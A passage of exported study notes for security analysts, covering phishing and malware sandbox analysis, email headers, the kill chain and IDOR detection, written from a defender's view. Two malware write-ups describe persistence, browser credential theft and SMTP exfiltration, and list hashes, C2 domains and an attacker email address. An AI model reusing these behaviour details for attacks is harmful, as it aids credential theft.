startup\n\n\n\n"},"SOC/Dynamic-Email-Analysis":{"title":"Dynamic Email Analysis","links":["phishing"],"tags":[],"content":"URLs and files in an email need to be checked to make sure they are safe. The websites and files in the mail should be run in sandbox environments and the changes made to the system should be examined to see if they are harmful or not and in no circumstance should they be run in local host in our network.\nTools\nBrowserling\n\nYou can use online web browsers such as Browserling to quickly check the web addresses in the email. The advantage of such services is that you are not burdened by a possible zero-day vulnerability that would impact browsers, as you are not visiting the website on your own computer. On the other hand, the disadvantage of using web browsers such as Browserling is that if the malicious file is downloaded from the website, you will not be able to run it. This could interrupt your analysis.\n\nBefore going to the links in the email, you should check if there is any important information in the URL. If we examine the example in the image above, and the user’s email address in the email parameter. So even if the user does not enter their password on the phishing page, when they click on popularshoppingsite[.]com and visit the website, the attacker will know that this user is valid. The attacker can increase the success rate of the attack by social engineering the valid users in later attacks. Therefore, it is important to change information such as email addresses before accessing websites.\n\nSandbox Environments\nSandbox environments allow you to examine suspicious files and websites without the risk of infecting your computer with malware. Many sandbox services/products are available for both paid and free use. You can choose one or more of these services according to your needs.\nSome commonly used sandboxes:\n\nVMRay\nCuckoo Sandbox \nJoeSandbox\nAnyRun\nHybrid Analysis(Falcon Sandbox)\n\nSome petty tricks\nMalware can wait a certain amount of time without taking any action to make detection more difficult. You have to wait for the malware to take action before you decide that the file being scanned is not malicious.\nAlso, the fact that there are no URLs and files in the email does not mean that it is not malicious. The attacker may also send the malware as an image to avoid detection by the analysis tools."},"SOC/Dynamic-Malware-Analysis-Example-1":{"title":"Dynamic Malware Analysis Example 1","links":[],"tags":[],"content":"File Name: e-Archive Dekont.exe\nMD5 Hash: 7a0093c743fc33a5e111f2fec269f79b\nSHA256 Hash: 722ef401e5cbb067c5c33faa402774d3c75ef08e0c8cc4d7e66a9cfa53684088\nPreparing\nBecause our monitoring tools list all the activities that have been done since the time the malware was run, we should run these tools before executing the suspicious program we have. Otherwise, we will not be able to see malicious activities on these tools even though they carry out malicious software activities.\nLet’s run our tool called ‘Process Hacker’ to see the process activities. Because we will run the malware by clicking on the desktop, we will see the process belonging to the malware under the explorer.exe process, so we need to pay special attention to it.\n\nTo see the file activities, run the tool called “Procmon” in the SysInternals toolkit. This tool allows us to see process, file, registry and network activities. However, since there are so many logs, it can be difficult to read and conclude meaningful results. (Yes, even if you don’t see it, your OS really works that much in the background!)\n\nRun RegShot to see registry activities. Take a shot by pressing the “1st shot” button before running the malware. This process will take some time.\n\nYou can use Wireshark and Fiddler to see network activities. Fiddler will suffice, as the malware we reviewed communicates over the HTTP protocol.\n\nAnalyze\nNow that we have completed the necessary preparations before running the malware, you can run the malware on your VM.\nFor a better understanding, we will examine the process, network, registry and file activities separately. After reviewing these activities, we will create a timeline.\nAfter allowing enough time for the malware to perform its activity, let’s take the second shot by pressing the “2nd shot” button from the Regshot tool.\n\nProcess Activities\nAs we mentioned earlier in our training series, there are some advantages of detecting process activities first. Since we will encounter a lot of logs and activities, the first step we need to do is to detect the processes belonging to the malware.\nWhen we examine the processes occurred over Process Hacker, we see that only one process belonging to the malware is running.\n\nHowever, things are not always as they seem! Since Process Hacker only shows the processes that are running momentarily, the malware may have created a child process at a time we did not monitor and terminated it later.\nAt this point, the Procmon tool comes to our rescue. If you press the “Show Process Tree” button in the top menu, procmon will show the process tree it has created for you during the time it has recorded.\n\nThe process tree provided by Procmon completes this shortcoming of Process Hacker, as it also includes terminated processes.\n\nWhen we go over the the image above, we see that the first process we run (9076 PID) runs the tool called “schtasks.exe” belonging to Windows Task Scheduler (PID 4800) and then runs its own malware (7944 PID) again.\nBefore moving on to other activities, let’s examine the schtasks.exe process. Schtasks.exe is a tool that enables the Task Scheduler to be used via the command interface in the Windows operating system. Attackers ensure persistency by adding their own malware to scheduled tasks with the help of Task Scheduler.\nIn order to see what kind of scheduled task the attacker added, we must click on the “schtasks.exe” (4800 PID) in the process tree of procmon and examine its details.\n\nWhen we examine the command-line arguments, we see that a scheduled task named “Updates\\VbxFiQYCyFDgGL” has been created. However, the information of the scheduled task except for its name is in the XML file located at the following path:\n“C:\\Users\\Amanda\\AppData\\Local\\Temp\\tmpCCF2.tmp”.\nClick here to get information about the command-line arguments of the tool named Schtasks.exe.\nWhen you try to access the relevant file, you can see that the file is deleted. But don’t worry, this scheduled task is now saved so we can see it through the Scheduler Task.\n\nOn the Trigger tab, you can see in which situations this scheduled task added by the attacker will run. As it can be seen on the screenshot above this scheduled task will run at log on.\n\nYou can see what action will run on the Actions tab. You can see on the above screenshot that the malicious software named “VbxFiQYCyFDgGL.exe” prepared by the attacker will run when this scheduled task runs.\nThis is how we have detected the scheduled task that the attacker added.\nWe detected malware processes (9076, 4800, 7944 PIDs) with the help of Procmon. Next, we need to detect the network, file and registry activities of these processes.\nYou filter down the processes with PID values of 9076, 4800, 7944 on Procmon. However, there is an easier method. When you right-click on the top parent process of the malware and press the “Add process and children to Include filter” button, procmon will create these filters for you.\n\nNetwork Activities\nSince the malware we examined communicates over the HTTP protocol, you can detect the connections it establishes very easily using the Fiddler tool.\nAfter running the malware, you can see that the process named “e-archive dekont.exe” on Fiddler communicates with the domain “5gw4d[.]xyz”.\n\nRegistry Activities\nWhen we examine the registry activities, you can see that the keys under HKLM\\Software\\WOW6432Node\\Microsoft\\Windows\\CurrrentVersion\\Uninstall are queried. There are settings under this key that are left by the applications installed in the system for uninstall. It is often preferred to enumerate this key to detect applications installed on the system by attackers.\n\nFile Activities\nTo detect malware file activities, disable the other three activities in the top menu of procmon.\n\nYou can enter a filter with Operation=CreateFile to see file creation activities.\nWhen we examine the logs, we see that an executable file named “VbxFiQYCyFDgGL.exe” is written under the “C:\\Users\\Amanda\\AppData\\Roaming” directory.\n\nWhen we look at the hash of the application named “VbxFiQYCyFDgGL.exe” with the tool called HashMyFiles, we see that it is actually the same file as the file we analyzed first. We see that the malware has copied itself to a different folder.\n\nWhen we examine the file activities further, we see that the malware reads the files to steal information from applications such as Firefox, Chome, Thunderbird. We have determined that the malware we have is information stealer.\n\nResult\nNow that we have completed the malware analysis, we can combine the information we have gathered. We have detected that:\n\nthe malware has copied itself to the “C:\\Users\\Username\\AppData\\Roaming” directory with the name “VbxFiQYCyFDgGL.exe”,\nhas used Task Scheduler to ensure persistence,\nhas enabled its own malicious application to run at every logon by creating a scheduled task with the name “VbxFiQYCyFDgGL” \ncommunicates with the command &amp; control server,\nthe command control address is “5gw4d[.]xyz/PL341/index.php” and it communicates over the HTTP protocol,\ndiscovers the applications installed in the system with the help of the key under the “HKLM\\SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall” registry key,\nsteals sensitive data from applications such as Chrome, Firefox, Thunderbird.\n\nArtifacts\nMD5: 7a0093c743fc33a5e111f2fec269f79b\nSHA256: 722ef401e5cbb067c5c33faa402774d3c75ef08e0c8cc4d7e66a9cfa53684088\nFile Name: e-Archive Dekont.exe\nFile Name: VbxFiQYCyFDgGL.exe\nDomain: 5gw4d[.]xyz\nURL: http[:]//5gw4d[.]xyz/PL341/index.php"},"SOC/Dynamic-Malware-Analysis-Example-2":{"title":"Dynamic Malware Analysis Example 2","links":[],"tags":[],"content":"File Name: Sales Order Sheet.pdf.exe\nMD5 Hash: 411019bcb582ef6e3dab080d99925b4b\nSHA256 Hash: f381e338212079c3a03fbbb532cdec44b1d27db03e8cc4c47408ef038885d934\nPreparing\nBecause our monitoring tools list all the activities that have been done since the time the malware was run, we should run these tools before executing the suspicious program we have. Otherwise, we will not be able to see malicious activities on these tools even though they carry out malicious software activities.\nLet’s run our tool called ‘Process Hacker’ to see the process activities. Because we will run the malware by clicking on the desktop, we will see the process belonging to the malware under the explorer.exe process, so we need to pay special attention to it.\n\nTo see the file activities, run the tool called “Procmon” in the SysInternals toolkit. This tool allows us to see process, file, registry and network activities. However, since there are so many logs, it can be difficult to read and conclude meaningful results. (Yes, even if you don’t see it, your OS really works that much in the background!)\n\nRun RegShot to see registry activities. Take a shot by pressing the “1st shot” button before running the malware. This process will take some time.\n\nOpen the Wireshark application to see network activities.\n\nAnalyze\nNow that we have completed the necessary preparations before running the malware, you can run the malware on your VM.\nFor a better understanding, we will examine the process, network, registry and file activities separately. After reviewing these activities, we will create a timeline.\nAfter allowing enough time for the malware to perform its activity, let’s take the second shot by pressing the “2nd shot” button from the Regshot tool.\n\nProcess Activities\nWhen we examine the running processes using Process Hacker, we see that only 1 process belonging to the malware is running.\n\nLike in our previous example, the malware may have created a different process, but we may not be able to see it because it is not running instantly. Let’s confirm this behavior using the procmon tool.\nIf you press the “Show Process Tree” button in the top menu, procmon will show the process tree it has created for you during the time it has recorded.\n\nAs we can see in the image above, we see that the first process we run (8780 PID) has a child process (7100 PID) named “regsvcs.exe”.\nRegsvcs.exe is a tool called .NET Service Installation Utility, which is installed by default in Windows operating systems by Microsoft.\nAttackers often name applications that come by default in the operating system to avoid detection. We have to determine whether the malware we are examining is really the legitimate application that comes by default in Windows or it is how the attacker named his own software to prevent detection.\n\nWhen we examine the path information of the process, we see that the actual directory where the RegSvcs.exe tool, which comes by default in the Windows operating system appears. But, we still need to do a hash check to verify this.\nLet’s get the hash of “C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\RegSvcs.exe” with the help of the tool named HashMyFile.\n\nWhen we search the hash on VirusTotal, we see the the information that states the relevant application has been published by Microsoft.\n\nWe have determined that the running application is indeed an application published by Microsoft. So does this mean the app is safe?\nAttackers can inject malicious code into legitimate applications by using techniques such as Code Injection, Process Hollowing, Reflective DLL Injection that allow these applications to run the malicious codes. In addition, there are binaries that are called “living of the land binary” and that allow malicious activities to be carried out without injecting malicious code.\nWe can assume that our malware creates this process to perform a malicious activity since it’s created by malware. However, we must always support our assumptions with valid evidence. The next time when we examine network, registry activities, we will prove that this process is indeed used for malicious purposes.\nWe detected malware processes (8780, 7100 PIDs) with the help of Procmon. Next, we need to detect the network, file and registry activities of these processes.\nYou can filter down processes with PID values ​​of 8780, 7100 on Procmon. However, there is an easier method. When you right-click on the top parent process of the malware and press the “Add process and children to Include filter” button, procmon will create these filters for you.\n\nNetwork Activities\nBefore performing our analysis on Wireshark, let’s check to see if the malware makes any web requests, as it can be examined more easily.\nWhen we look at the Fiddler application, we see that there is a web request made by the malware (regsvcs.exe, 7100 PID).\n\nWhen we examine the web request, we see that the malware makes a request to checkip.dyndns.org in order to find the public IP address. Attackers often use IP address learning services to perform targeted attacks or learn the victim’s IP address. This behavior may be considered commonplace for malware.\nDid you notice the name of the process making the web request? “Regsvcs.exe” should not throw such a request in normal use.\nWhen we examine the network activities over Wireshark, we see that there is SMTP traffic. SMTP is the protocol used for sending email. Since we didn’t send email, we can say that this is a very suspicious traffic.\n\nYou can clearly see all SMTP traffic by right-clicking on any SMTP packet and clicking “Follow” then “TCP Stream”.\n\nIf we examine the SMTP traffic, we find that the malware connects to skychine[.]com[.]my’s mail server and sends email to graceunlimited153@gmail[.]com with “Pc Name: admin | Snake Keylogger”.\n\nWhen we look at the content of the mail, we see that there are multiple attachments with names such as “Password.txt”, “User.txt”. In order to bring the contents to readable format, we have to base64 decoding.\n\nAs you can see from the subject title and email content, the malware we analyzed is actually Snake Keylogger.\nWhen we look at the e-mail content, we can see that the malware sends the user name, password information of the web applications and the IP address of the device.\nAttackers often send the information they have obtained to their own email addresses using SMTP servers that they have previously seized. In other words, the skychine[.]com[.]my domain name is actually an SMTP server that is not malicious but is hijacked by the attacker and used for malicious purposes. However, since the email sent was sent to the attacker’s email address, the graceunlimited153@gmail.com address most likely belongs to the attacker.\nResult\nNow that we have completed the malware analysis, we can combine the information we have gathered. We have detected that:\n\nIt’s Snake Keylogger\nSteals credentials from browsers\nChecks IP address\nExfiltrates data via SMTP\nConnects skyshine.com[.]my:25\n\nArtifacts\nMD5: 411019bcb582ef6e3dab080d99925b4b\nSHA256: f381e338212079c3a03fbbb532cdec44b1d27db03e8cc4c47408ef038885d934\nFile Name: Sales Order Sheet.pdf.exe\nDomain: checkip.dyndns.org\nDomain: skyshine[.]com[.]my"},"SOC/EDR":{"title":"EDR","links":[],"tags":[],"content":"Endpoint Detection and Response (EDR), also known as Endpoint Threat Detection and Response (ETDR), is an integrated endpoint security solution that combines continuous, real-time monitoring and collection of endpoint data with rules-based automated response and analysis capabilities.\nSome EDR solutions commonly used in the workplace: CarbonBlack, SentinelOne, and FireEye HX.\nContainment\nWe need to isolate a hacked machine from the network. There are two important reasons for doing this: to prevent the attacker from connecting to the internal network and moving around the internal network.\nTherefore, the device should be isolated from the internal and external networks until the vulnerabilities are repaired and the device is ready for use. You can ensure isolation by using the containment feature of EDR solutions. This feature allows the selected device to communicate solely with the EDR center. This means that even though the device is isolated from the network, you can continue your analysis."},"SOC/Email-Harvesting":{"title":"Email Harvesting","links":[],"tags":[],"content":"Email harvesting is the process of obtaining email addresses from public, paid, or free services.\nA tool used for email harvesting is: theHarvester."},"SOC/Email-Header-Analysis":{"title":"Email Header Analysis","links":["SOC/Phishing","IP-address","mxtoolbox.com","phishing"],"tags":[],"content":"Here are the key questions we need to answer when checking headings during a Phishing analysis:\n\nWas the email sent from the correct SMTP server?\nAre the data “From” and “Return-Path / Reply-To” the same?\n\nWas the email sent from the correct SMTP server?\nWe can check the “Received” field to see the path the email took. As you can see in the image below, the email came from the server with the IP address “101[.]99.94.116”.\n\nIf we look at who is sending the mail (“sender”), we can see that it is coming from the domain “letsdefend.io”.\n\nSo, under normal circumstances, “letsdefend.io” should be using “101[.]99.94.116” to send mail. To confirm this, we can query the MX servers that “letsdefend.io” is actively using.”\nMXToolBox will help us by showing you the MX servers used by the domain you are asking for.\n\nIf we look at the image above, the domain “letsdefend.io” uses Google addresses as its email server. So there is no relation with the addresses emkei[.]cz or “101[.]99.94.116”.\nThis examination showed that the email did not come from the original address, but was spoofed.\nAre the ‘From’ and ‘Return-Path / Reply-To’ details the same?\nExcept in exceptional cases, we expect the sender of the email and the recipient of the replies to be the same. Here is an example of how these parts are used differently in phishing attacks:\nSomeone sends an email (Gmail, Hotmail, etc.) to LetsDefend with the same last name as someone who works for Google, LetsDefend tells the employee that they have issued the invoice and they need to pay to their XXX account. It inserts the real Google employee’s email address in the “Reply-To” field so that the fake email address will not stand out when the email is replied to.\nGoing back to the email we downloaded above, all we need to do is compare the email addresses in the ‘From’ and ‘Reply-to’ sections.\n\nAs you can see, the data is different. In other words, if we want to reply to this email, we will send a reply to the gmail address below. Please note that just because this data is different doesn’t always mean that it’s definitely a phishing email, we need to look at the event as a whole. In other words, in addition to this suspicious situation, if there’s a malicious attachment, URL, or misleading content in the content of the email, we can understand that it’s a phishing email."},"SOC/Email-Header":{"title":"Email Header","links":[],"tags":[],"content":"What is an Email Header?\nThe header is a section of the email containing information such as sender, recipient, and date. There are also components such as ‘Return-Path’, ‘Reply-To’, and ‘Received’. Below you can see the header details of an example email\n\nWhat does the Email Header do?\n1. Allows you to identify the sender and recipient\nThanks to the “From” and “To” fields in the header, you can find out who is sending an email and who is receiving it. If we look at the email above, which you have downloaded in “eml” format, we can see that it was sent from “ogunal@letsdefend.io” to “info@letsdefend.io”.\n\n2. Spam Blocker\nIt is possible to detect spam emails using header analysis and various other methods. This prevents people from receiving SPAM emails.\n3. Allows You to Track an Email’s Route\nIt is important to check the route an email takes to see if it came from the correct address. If we look at the example email above, we can see that it came from the address “ogunal@letsdefend.io”, but it is still not certain whether it came from the domain “letsdefend.io” or from another fake server that imitates the same name. We can use the header information to answer this question.\nImportant Fields\nFrom\nThe ‘From’ field in an Internet header shows the name and email address of the sender.\nTo\nThis field in the mail header contains the details of the recipient of the email, including their name and email address. Such as CC (carbon copy) and BCC (blind carbon copy) also fall under this category, as they all contain details of your recipients.\nTo find out more about carbon copy and blind carbon copy, see How to use CC and BCC.\nDate\nThis is the timestamp showing when the email was sent.\nIn Gmail, it usually follows the format day dd month yyyy hh:mm:ss\nSo if an email was sent on 16 November 2021 at 4:57:23 pm, it would show up as Wed, 16 Nov 2021 16:57:23.\nSubject\nThe subject is the topic of the email. It summarises the content of the entire message body.\nReturn Path\nThis email header field is also known as Reply-To. When you reply to an email, the reply is sent to the address specified in the Return-Path field.\nDomain Key and DKIM Signatures\nDomain Key and Domain Key Identified Mail (DKIM) are email signatures that help email service providers identify and authenticate your emails, similar to SPF signatures.\nMessage-ID\nThe Message-ID header is a unique combination of letters and numbers that identifies each email. No two emails will have the same Message ID.\nMIME-Version\nMultipurpose Internet Mail Extensions (MIME) is an Internet coding standard. It converts non-text content, such as images, videos, and other attachments, into text so that non-text content can be attached to an email and sent via SMTP (Simple Mail Transfer Protocol).\nReceived\nThe Received section lists each mail server that an email has passed through before arriving in the recipient’s inbox. It’s listed in reverse chronological order - the mail server at the top is the last server the email message passed through, and the mail server at the bottom is where the email originated.\nX-Spam Status\nThe X-Spam Status shows you the spam score of an email message.\nFirst, it’ll highlight if a message is classified as spam.\nIt then shows the spam score of the email and the spam threshold for the email.\nAn email can either meet or exceed an inbox’s spam threshold. If it’s too spammy and exceeds the threshold, it’s automatically classified as spam and sent to the Spam folder.\nHow to Access Email Header?\nGmail\n1. Open the email in question\n2. Click on the 3 dots at the top right ”…“\n3. Click on the “Download message” button.\n\n4. Open the downloaded file with the extension “.eml” with any notebook application\nOutlook\n1. Open the email in question\n2. File → Info → Properties → Internet headers\n\n"},"SOC/Fast-Flux":{"title":"Fast Flux","links":["Networking/DNS","SOC/Phishing","SOC/C2"],"tags":[],"content":"Fast Flux is a DNS technique used by botnets to hide Phishing, web proxying, malware delivery, and malware communication activities behind compromised hosts acting as proxies.\nThe purpose of using the Fast Flux network is to make the communication between malware and its command and control server (C2) challenging to be discovered by security professionals."},"SOC/Gaining-Initial-Foothold":{"title":"Gaining Initial Foothold","links":["SOC/Reconnaissance","reverse-shell"],"tags":[],"content":"\n1. Reconnaissance\nReconnaissance is the first step and it provides adversary with all the info needed for getting into a system. It is described in more detail in Reconnaissance page.\n2. Weaponization \n(MITRE Tactic TA0001)\nThis phase of the UKC describes the adversary setting up the necessary infrastructure to perform the attack. For example, this could be setting up a command and control server, or a system capable of catching reverse shells and delivering payloads to the system.\n3. Social Engineering\n(MITRE Tactic TA0001)\nThis phase of the UKC describes techniques that an adversary can employ to manipulate employees to perform actions that will aid in the adversaries attack. For example, a social engineering attack could include:\n\nGetting a user to open a malicious attachment.\nImpersonating a web page and having the user enter their credentials.\nCalling or visiting the target and impersonating a user (for example, requesting a password reset) or being able to gain access to areas of a site that the attacker would not previously be capable of (for example, impersonating a utility engineer).\n\n4. Exploitation \n(MITRE Tactic TA0002)\nThis phase of the UKC describes how an attacker takes advantage of weaknesses or vulnerabilities present in a system. The UKC defines “Exploitation” as abuse of vulnerabilities to perform code execution. For example:\n\nUploading and executing a reverse shell to a web application.\nInterfering with an automated script on the system to execute code.\nAbusing a web application vulnerability to execute code on the system it is running on.\n\n5. Persistence\n(MITRE Tactic TA0003)\nThis phase of the UKC is rather short and simple. Specifically, this phase of the UKC describes the techniques an adversary uses to maintain access to a system they have gained an initial foothold on. For example:\n\nCreating a service on the target system that will allow the attacker to regain access.\nAdding the target system to a Command &amp; Control server where commands can be executed remotely at any time.\nLeaving other forms of backdoors that execute when a certain action occurs on the system (i.e. a reverse shell will execute when a system administrator logs in).\n\n6. Defense Evasion\n(MITRE Tactic TA0005)\nThe “Defense Evasion” section of the UKC is one of the more valuable phases of the UKC. This phase specifically is used to understand the techniques an adversary uses to evade defensive measures put in place in the system or network. For example, this could be:\n\nWeb application firewalls.\nNetwork firewalls.\nAnti-virus systems on the target machine.\nIntrusion detection systems.\n\nThis phase is valuable when analyzing an attack as it helps form a response and better yet - gives the defensive team information on how they can improve their defence systems in the future.\n7. Command &amp; Control\n(MITRE Tactic TA0011)\nThe “Command &amp; Control” phase of the UKC combines the efforts an adversary made during the “Weaponization” stage of the UKC to establish communications between the adversary and target system.\nAn adversary can establish command and control of a target system to achieve its action on objectives. For example, the adversary can:\n\nExecute commands.\nSteal data, credentials and other information.\nUse the controlled server to pivot to other systems on the network.\n\n8. Pivoting\n(MITRE Tactic TA0008)\n“Pivoting” is the technique an adversary uses to reach other systems within a network that are not otherwise accessible (for example, they are not exposed to the internet). There are often many systems in a network that are not directly reachable and often contain valuable data or have weaker security.\nFor example, an adversary can gain access to a web server that is publicly accessible to attack other systems that are within the same network (but are not accessible via the internet)."},"SOC/Hash":{"title":"Hash","links":[],"tags":[],"content":"A hash value is a numeric value of a fixed length that uniquely identifies data. It is the result of a hashing algorithm.\nCommon Hash Types\nMD5\n(Message Digest, defined by RFC 1321\nMD5 is a widely used cryptographic hash function with a 128-bit hash value. MD5 hashes are NOT considered cryptographically secure. In 2011, the IETF published RFC 6151, “Updated Security Considerations for the MD5 Message-Digest and the HMAC-MD5 Algorithms,” which mentioned a number of attacks against MD5 hashes, including the hash collision.\nSHA-1\n(Secure Hash Algorithm 1, defined by RFC 3174)\nWhen data is fed to SHA-1 Hashing Algorithm, SHA-1 takes an input and produces a 160-bit hash value string as a 40 digit hexadecimal number. NIST deprecated the use of SHA-1 in 2011 and banned its use for digital signatures at the end of 2013 based on it being susceptible to brute-force attacks. Instead, NIST recommends migrating from SHA-1 to stronger hash algorithms in the SHA-2 and SHA-3 families.\nSHA-2\n(Secure Hash Algorithm 2)\nSHA-2 Hashing Algorithm was designed in 2001 to replace SHA-1. SHA-2 has many variants, and arguably the most common is SHA-256. The SHA-256 algorithm returns a hash value of 256-bits as a 64 digit hexadecimal number."},"SOC/How-Web-Applications-Work":{"title":"How Web Applications Work","links":["Networking/TCP"],"tags":[],"content":"HTTP Requests\nAn HTTP request is used to retrieve a specific resource from a web server. The web server’s job is to process the response received and present it to the user.\nAll requests must conform to a standard HTTP format so that web servers can understand the request. If the request is sent in a different format, the web server will not recognize it and will return an error to the user, or the web server may not be able to provide service (which is another type of attack).\n\nAn HTTP request consists of a request line, request headers, and a request message body. The request line consists of the HTTP method and the resource requested from the web server.\nThe request headers contain certain headers that the server will process.\nThe request message body contains the data to be sent to the server.\nThe image above shows an example of an HTTP request. Let’s examine this HTTP request line by line.\n\n\nThe GET method indicates that the resource ”/” is being requested from the server. Because there is no name, a symbol like ”/” means that the main page of the web server is being requested.\n\n\nNowadays there are web applications that belong to more than one domain found on a single web server, so browsers use the “Host” header to identify which domain the requested resource belongs to.\n\n\nWhen a web application wants to store information on the client’s device, it stores it in a “cookie” header. Cookies are typically used to store session information. This saves you from having to re-enter your username and password when you visit a web application that requires you to log in.\n\n\nThe “Upgrade-Insecure-Requests” header indicates that the client wants to communicate using encryption (SSL).\n\n\nThe “User-Agent” header contains information about the client’s browser and operating system. Web servers use this information to send specific HTTP responses to the client. You can find some automated vulnerability scanners by looking under this header.\n\n\nThe type of data requested is in the “Accept” header.\n\n\nThe type of encoding accepted by the client is found in the “Accept-Encoding” header. You can usually find the names of compression algorithms under this header.\n\n\nThe “Accept-Language” header contains the client’s language information. The web server uses this information to display the prepared content in the client’s language.\n\n\nThe “Connection” header shows how the HTTP connection is made. If there is data such as “close”, it means that the TCP connection will be closed after receiving the HTTP response. If you see “keep-alive”, this means that the connection will be maintained.\n\n\nAn empty line is inserted between the HTTP request header and the HTTP request message body to create a partition.\n\n\nAny other data to be sent to the web application is in the Request Message Body. If the HTTP POST method is used, then the POST parameters can be found here.\n\n\nHTTP Responses\nWhen the web server receives an HTTP request, it performs the necessary checks and processes and then sends the requested resource to the client. There is no standard process, as there are many technologies and designs involved. The server may pull data from the database depending on what the requested resource is, or it may process the incoming data. However, the HTTP Response Message must reach the client after all the processing.\nAn HTTP response message contains a Status Line, Response Headers, and a Response Body.\n\nThe Status line contains the status code (e.g. 200: OK) and HTTP protocol information.\nThe Response Header has some headers are used for a variety of purposes.\nThe Response Body contains information about the requested resource.\n\nIf a web page has been requested, there will usually be HTML code in the Response Body. When the client receives the HTML code, the web browser will process the HTML code and display the web page.\n\nLet’s examine an HTTP response request using this image.\nStatus Line\nThe Status Line contains information about the HTTP version and the HTTP Response Status Code. The HTTP Response Status Code is used to describe the status of the request. There are many HTTP response status codes, but they can be summarized as follows:\n-      100-199: Informational responses\n-      200-299: Successful responses\n-      300-399: Redirection message\n-      400-499: Client error responses\n-      500-599: Server error responses\nResponse Headers\nHere are some HTTP Response Headers that you may encounter frequently:\n-      Date: The exact time the server sent the HTTP Response to the client.\n-      Connection: This indicates how the connection is handled, just like the HTTP Request header.\n-      Server: It informs about the operating system of the server and the version of the web server.\n-      Last-Modified: It provides information about when the requested resource was modified. This header is used by the caching mechanism.\n-      Content-Type:  The type of data being sent.\n-      Content-Length: The size of the data sent. \nResponse Body\nThe HTTP response body contains the resource sent by the server and requested by the client.\n"},"SOC/IDOR-Attack":{"title":"IDOR Attack","links":[],"tags":[],"content":"What is IDOR?\nInsecure Direct Object Reference (IDOR) is a vulnerability caused by the absence or improper use of an authorization mechanism. It allows one person to access an object that belongs to another.\n\nIDOR, or “Broken Access Control”, is the number one web application vulnerability listed in the 2021 OWASP.\nHow IDOR Works\nIDOR is not a vulnerability caused by poor sanitation like other web application-based vulnerabilities. The attacker manipulates the parameters sent to the web application, gains access to an object that doesn’t belong to him, and is then able to read, modify, or delete the contents.\nHere’s an example to better understand how the IDOR vulnerability is exploited.\nImagine a simple web application. It retrieves the “id” variable from the user and then displays data that belongs to the user who made the request.\nURL: letsdefend.io/get_user_information\nWhen a request like the one above is made in our web application, it displays the information of the user with an id value of 1.\nIf I am the user who made the request and my ID value is 1, everything will work normally. When I make the request, I see my personal information.\nBut what happens if we make a request with 2 as the “id” parameter? Or 3?\nIf the web application does not check that the “id” value in the request belongs to the person making the request, then anyone can make that request and see the user’s information. This web vulnerability is called IDOR.\nAttackers can access items that do not belong to them by changing parameters such as the “id”. The type of information they can access may vary depending on the web application, but either way, you wouldn’t want anyone to access your personal information, so this is very critical.\nHow Attackers Take Advantage of IDOR Attacks\nWhat an attacker can do is limited by the scope of an IDOR vulnerability. However, the most common areas are usually pages where a user’s information is received. If an attacker were to exploit an IDOR vulnerability, they could:\n\nSteal personal information\nAccess unauthorized documents \nTake unauthorized actions (such as deleting, modifying)\n\nHow to Prevent IDOR\nAlways check that the person making the request is authorized to provide a secure environment without an IDOR vulnerability.\nIn addition, unnecessary parameters should be removed and only the minimum number of parameters should be taken from the user. If we think about the previous example, we don’t need to get the “id” parameter. Instead of getting the “id” parameter from the user, we can use the session information to identify the person who made the request.\nDetecting IDOR Attacks\nIDOR attacks are harder to detect than other attacks. This is because it does not have certain payloads such as SQL injection and XSS.\nHTTP responses would help identify IDOR attacks. However, HTTP responses are not logged for several reasons. This makes it more difficult to identify IDOR attacks.\nA number of methods can be used to identify IDOR attacks. These are:\n\nCheck all parameters: An IDOR vulnerability can occur in any parameter. Therefore, do not forget to check all parameters.\nLook at the number of requests made to the same page: When attackers discover an IDOR vulnerability, they usually want to access the information of all the other users, so they typically perform a brute-force attack. This is why you may see many requests for the same page from one source.\nTry to find a pattern: Attackers will plan a brute-force attack to reach all objects. Since they will be performing the attack on successive and predictable values, such as whole numbers, you can try to find a pattern in the requests you see. For example, if you see requests like id=1, id=2, id=3, you might be suspicious.\n\nA Detection Example\nBelow is a screenshot of logs found on a web server running WordPress.\n\nAs with our other examples, let’s start with a general, broad search. As there are no special characters in the requests made, we can easily read the logs.\nIf you have used Wordpress before, you may know that the “wp-admin/user-edit.php” page contains information about registered Wordpress users. It might seem normal to be able to access this page, in fact, if you have more than one registered user you might be able to access it with more than one “user_id:” parameter. But it is abnormal to have so many different “user_id” parameters.\nIt looks like we have an IDOR attack on our hands.\nWhen we look at the source IP, we see that it belongs to Cloudflare. This means that the web application for which we have got the access log was using a service provided by Cloudflare. So the requests were being sent to the web application through Cloudflare.\nThe fact that the access logs record 15-16 requests within the short time frame shows us that the attack is being carried out with an automated device. If we look at the User-Agent header, we can see that it says “wfuzz/3.1.0”. Wfuzz is a tool that is often used by attackers. So not only have we established that this attack was carried out by an automated scanning tool, but we have also established that it was carried out by a tool called Wfuzz.\nBut we still haven’t answered the most important question.\nWas the attack successful?\nDid the attacker gain access to the users’ information?\nOur job would be easier if we had the HTTP responses. But since we don’t have the HTTP responses, let’s look at the response size in the access logs and make an inference.\nAs we mentioned earlier, the requested page displayed user information. Information such as user names, surnames, and the total size of the user names will not be the same. Therefore, we can ignore requests with a response size of 479 bytes.\nLooking at the requests with response sizes 5691 and 5692, we can see that the response code is 302 (redirect). Successful web requests are usually returned with a response code of 200. So we can assume that the attack was unsuccessful. However, this information alone may not be enough to determine that the attack was definitely unsuccessful.\nThere are 10 requests with the response size of 5692 and 4 with the response size of 5691.\nAs we mentioned before, there is a very small chance that the sum of all information such as user name, surname, and username will be the exact same. This increases the likelihood that the attack was not successful."},"SOC/MITRE-ATT-and-CK-Framework":{"title":"MITRE ATT&CK Framework","links":["SOC/SOC","SOC/MITRE-ATT-and-CK-Matrix","SOC/MITRE-ATT-and-CK-Tactics","SOC/MITRE-ATT-and-CK-Technics--and--Sub-Techniques","SOC/MITRE-ATT-and-CK-Mitigations","SOC/APT-Groups","SOC/Phishing"],"tags":[],"content":"\nIntroduction\nWhat even is this MITRE thing? 🤔\nMITRE ATT&amp;CK that stands for Adversarial Tactics, Techniques, and Common Knowledge is the framework of a knowledge database that has been continuously developed and expanded along with the technology in cybersecurity\nWhy is it so important? 🤷‍♂️\nEach step of cyber attacks is covered in detail in the MITRE ATT&amp;CK Framework, SOC Analysts can clearly map attacks, prevent them, and an in-depth report can be written and the details of the attack can be archived for a later use. Since this framework provides a clear roadmap of cyber attacks, researches can be conducted on other possible cyber attacks that have not yet occurred yet to develop ways to detect or avoid them.\nThe Framework\n1. MITRE ATT&amp;CK Matrix\n2. MITRE ATT&amp;CK Tactics\n3. MITRE ATT&amp;CK Technics &amp; 